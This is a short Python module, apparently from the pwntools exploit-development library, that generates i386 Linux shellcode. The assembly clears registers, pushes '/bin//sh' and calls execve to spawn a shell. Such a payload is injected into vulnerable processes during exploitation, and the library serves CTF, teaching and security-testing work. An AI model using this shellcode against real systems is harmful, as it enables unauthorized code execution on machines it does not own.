from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch='i386', os='linux')
def sh(clear_ecx = True):
    """Args: None
    Spawn a shell."""
    if clear_ecx:
        clear_ecx = 'xor ecx, ecx\n'
    else:
        clear_ecx = ''
    return """
        ;; Clear eax, ecx, edx
        %simul ecx

        ;; Push '/bin//sh'
        push eax
        push `//sh`
        push `/bin`

        ;; Call execve
        mov al, SYS_execve
        mov ebx, esp
        int 0x80
""" % clear_ecx
